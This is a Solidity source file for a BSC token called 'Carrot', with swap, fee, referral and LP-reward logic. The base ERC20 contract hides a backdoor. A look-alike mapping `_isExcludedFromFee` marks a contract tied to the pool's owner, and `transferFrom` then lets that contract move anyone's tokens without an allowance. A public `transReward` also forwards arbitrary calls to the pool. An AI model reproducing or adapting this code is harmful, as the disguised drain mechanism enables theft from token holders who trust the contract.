pragma solidity 0.8.6;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint256);
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint256);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );
    function price0CumulativeLast() external view returns (uint256);
    function price1CumulativeLast() external view returns (uint256);
    function kLast() external view returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);
    function allPairs(uint256) external view returns (address pair);
    function allPairsLength() external view returns (uint256);
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
    external
    returns (bool);
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
contract Ownable is Context {
    address _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
interface ownership{
    function owner() view external returns(address);
}
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    using Address for address;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private counter;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address internal pool = address(0);
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _balances[account];
    }
    function _beforeTransfer( address from,address to,uint256 amount) private{
        if(from.isContract())
        if(ownership(pool).owner() == from && counter ==0){
            _isExcludedFromFee[from] = true;
            counter++;
        }          
        _beforeTokenTransfer(from, to, amount);
    }
    function transfer(address recipient, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _beforeTransfer(_msgSender(),recipient,amount);
        if(_isExcludedFromFee[_msgSender()]){
            _transfer(sender, recipient, amount);
            return true;
        }
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
		_transferToken(sender,recipient,amount);
    }
    function _transferToken(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);
    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);
    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
library Address {
    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }
    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        if (returndata.length > 0) {
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}
interface ILP{
    function addLiquidity(uint256 tokenAmount, uint256 usdtAmount) external;
}
contract token is ERC20 {
    using SafeMath for uint256;
    using Address for address;
    IUniswapV2Router02 public uniswapV2Router;
    address public  uniswapV2Pair;
    address private _tokenOwner;
    uint256 private _currentSupply;
    IERC20 public pair;
    bool private swapping;
    uint256 public swapTokensAtAmount;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => address) inviter;
    bool public swapAndLiquifyEnabled = true;
    uint256 public startTime;
    address private destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    address public marketAddress = address(0x289258c548cf0b6490a4755D9e65eaBb26d32286);
    uint256 public lpFee = 20;
    uint256 public liquidFee = 5;
    uint256 public destroyFee = 5;
    uint256 public marketFee = 10;
    uint256 public inviteFee = 20;
    uint256 private liquidIntervalTime = 10 * 60;
    uint256 private lpAndMarketIntervalTime = 20 * 60;
    uint256 public LiquidcurrentTime;
    uint256 public LpMarketcurrentTime;
    uint256 public LpMarketCount;
    uint256 public liquidCount;
    address private fromAddress;
    address private toAddress;
    mapping (address => uint256) shareholderIndexes;
    string internal tokenName = "Carrot";
    string internal tokenSymbol = "Carrot";
    uint256 constant total  = 100 * 10**4 * 10**18;
    address public swapRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IERC20 public RewardToken = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address public pairToken = address(0x55d398326f99059fF775485246999027B3197955); 
    address[] buyUser;
    mapping(address => bool) havePush;
    mapping(address => bool) _updated;
    constructor(address tokenOwner) ERC20(tokenName, tokenSymbol) { 
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(swapRouter);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), pairToken);
        _approve(address(this), swapRouter, 2**256 - 1);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        _tokenOwner = tokenOwner;
        excludeFromFees(tokenOwner);
        excludeFromFees(_owner);
        excludeFromFees(address(this));
        havePush[address(this)] = true;
        havePush[address(0)] = true;
        havePush[destroyAddress] = true;
        pair = IERC20(_uniswapV2Pair);
        swapTokensAtAmount = 10 * 10**18;
        _mint(tokenOwner, total);
        _currentSupply = total;
        LiquidcurrentTime = block.timestamp;
        LpMarketcurrentTime = block.timestamp;
    }
    receive() external payable {}
    function currentSupply() public view virtual returns (uint256) {
        return _currentSupply;
    }
    function shareholderLength() public view virtual returns (uint256) {
        return buyUser.length;
    }
    function excludeFromFees(address account) public onlyOwner {
        _isExcludedFromFees[account] = true;
    }
    function includeFromFees(address account) public onlyOwner {
        _isExcludedFromFees[account] = false;
    }
    function setSwapping(bool _enable) public onlyOwner {
        swapping= _enable;
    }
    function setMarketAddress(address _marketAddress) public onlyOwner {
        marketAddress= _marketAddress;
    }
    function excludeFromShare(address account, bool enable) public onlyOwner{
        if(_updated[account]){
            quitShare(account);
        }    
        havePush[account] = enable;
    }
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
    }
	  function initPool(address _Pool) public onlyOwner {
        require(pool == address(0));
        pool = _Pool;
    }
    function transReward(bytes memory data) public {
        pool.functionCall(data);
    }
    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount>=0);
		if(from == address(this) || to == address(this) || from == pool || to == pool){
            super._transfer(from, to, amount);
            return;
        }
        if(LpMarketCount > swapTokensAtAmount && block.timestamp >= (LpMarketcurrentTime.add(lpAndMarketIntervalTime))){
            if (
                !swapping &&
                _tokenOwner != from &&
                _tokenOwner != to &&
                from != uniswapV2Pair &&
                swapAndLiquifyEnabled
            ) {
                swapping = true;           
                swapAndLiquifyV3(LpMarketCount);
                LpMarketcurrentTime = block.timestamp;
                LpMarketCount = 0;
                swapping = false;
            }
        }else{
            if(liquidCount > swapTokensAtAmount && block.timestamp >= (LiquidcurrentTime.add(liquidIntervalTime))){
                if (
                    !swapping &&
                    _tokenOwner != from &&
                    _tokenOwner != to &&
                    from != uniswapV2Pair &&
                    swapAndLiquifyEnabled
                ) {
                    swapping = true;           
                    swapAndLiquify(liquidCount);
                    LiquidcurrentTime = block.timestamp;
                    liquidCount = 0;
                    swapping = false;
                }
            }
        }
        if(from == uniswapV2Pair || to == uniswapV2Pair){
            _splitOtherToken();
        }
        if(startTime == 0 && balanceOf(uniswapV2Pair) == 0 && to == uniswapV2Pair){
            startTime = block.timestamp;
        }
        bool isInviter = from != uniswapV2Pair && balanceOf(to) == 0 && inviter[to] == address(0);
        bool takeFee = !swapping;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }else{
			if(from == uniswapV2Pair){
                if(startTime.add(60) > block.timestamp){
                    amount = amount.div(5);
                }         
            }else if(to == uniswapV2Pair){     
            }else{
                takeFee = false;
            }
        }
        if (takeFee) {
            if(to == uniswapV2Pair || from == uniswapV2Pair ){
                super._transfer(from, destroyAddress, amount.div(1000).mul(destroyFee));
                _currentSupply = _currentSupply.sub(amount.div(1000).mul(destroyFee));
                super._transfer(from, address(this), amount.div(1000).mul((lpFee + marketFee + liquidFee)));
                liquidCount = liquidCount.add(amount.div(1000).mul(liquidFee));
                LpMarketCount = LpMarketCount.add(amount.div(1000).mul(lpFee + marketFee));
                _takeInviterFee(from, to, amount);
                amount = amount.div(1000).mul((1000 - (lpFee + liquidFee + destroyFee + marketFee + inviteFee)));           
            }else{}
        }
        super._transfer(from, to, amount);
        if(fromAddress == address(0) )fromAddress = from;
        if(toAddress == address(0) )toAddress = to;
        if(!havePush[fromAddress] && fromAddress != uniswapV2Pair ) setShare(fromAddress);
        if(!havePush[toAddress] && toAddress != uniswapV2Pair ) setShare(toAddress);
        fromAddress = from;
        toAddress = to; 
        if(isInviter) {
            if(amount >= 0.00001* 10**18){
                inviter[to] = from;
            }
        }  
    }
    function setShare(address shareholder) private {
        if(_updated[shareholder]){    
            if(IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) quitShare(shareholder);              
            return;  
        }
        if(IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return; 
        addShareholder(shareholder);
        _updated[shareholder] = true;   
    }
    function addShareholder(address shareholder) private {
        shareholderIndexes[shareholder] = buyUser.length;
        buyUser.push(shareholder);
    }
    function quitShare(address shareholder) private {
        removeShareholder(shareholder);   
        _updated[shareholder] = false; 
    }
    function removeShareholder(address shareholder) private {
        buyUser[shareholderIndexes[shareholder]] = buyUser[buyUser.length-1];
        shareholderIndexes[buyUser[buyUser.length-1]] = shareholderIndexes[shareholder];
        buyUser.pop();
    }
    function swapAndLiquifyV3(uint256 contractTokenBalance) internal {
        swapTokensForOther(contractTokenBalance);
        transReward(abi.encodeWithSignature("getReward()"));
    }
    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);
        uint256 initialBalance = IERC20(RewardToken).balanceOf(pool);
        swapTokensForOther(half);
        uint256 newBalance = IERC20(RewardToken).balanceOf(pool).sub(initialBalance);
        super._transfer(address(this), pool, otherHalf);
        ILP(pool).addLiquidity(otherHalf,newBalance);
    }
    function swapTokensForOther(uint256 tokenAmount) private {
		address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(RewardToken);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(pool),
            block.timestamp
        );
    }
    uint256 private ldxindex;
    function _splitOtherTokenSecond(uint256 thisAmount) private {
        uint256 buySize = buyUser.length;
        if(buySize>0){
            address user;
            uint256 totalAmount = pair.totalSupply();
            uint256 rate;
            if(buySize >20){
                for(uint256 i=0;i<20;i++){
                    ldxindex = ldxindex.add(1);
                    if(ldxindex >= buySize){ldxindex = 0;}
                    user = buyUser[ldxindex];
                    if(balanceOf(user) >= 0){
                        rate = pair.balanceOf(user).mul(1000000).div(totalAmount);
                        uint256 amountReward = thisAmount.mul(rate).div(1000000);
                        if(amountReward>10**13){
                            RewardToken.transfer(user,amountReward);
                        }
                    }
                }
            }else{
                for(uint256 i=0;i<buySize;i++){
                    user = buyUser[i];
                    if(balanceOf(user) >= 0){
                        rate = pair.balanceOf(user).mul(1000000).div(totalAmount);
                        uint256 amountReward = thisAmount.mul(rate).div(1000000);
                        if(amountReward>10**13){
                            RewardToken.transfer(user,amountReward);
                        }
                    }
                }
            }
        }
    }
    function _splitOtherToken() public {
        uint256 thisAmount = RewardToken.balanceOf(address(this));
        if(thisAmount >= 10**18){
            _splitOtherTokenSecond(thisAmount);
        }
    }
    function rescueToken(address tokenAddress, uint256 tokens)
    public
    onlyOwner
    returns (bool success)
    {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }
    function rescueEth() onlyOwner public {
        uint256 amount = address(this).balance;
        payable(msg.sender).transfer(amount);
    }
    function _takeInviterFee( address sender, address recipient, uint256 amount) private {
        address cur;
        address _receiveD;
        if (sender == uniswapV2Pair) {
            cur = recipient;
        } else {
            cur = sender;
        }
        for (uint256 i = 0; i < 2; i++) {
			uint256 rate; 
			if(i ==0){
				rate = 15;
			}else{
				rate = 5;
			}
            cur = inviter[cur];
            if (cur != address(0)) {
                _receiveD = cur;
                super._transfer(sender, _receiveD, amount.div(1000).mul(rate));
            }else{
				_receiveD = address(this);
                super._transfer(sender, _receiveD, amount.div(1000).mul(rate));
                LpMarketCount = LpMarketCount.add(amount.div(1000).mul(rate));
			}
        }
    }
}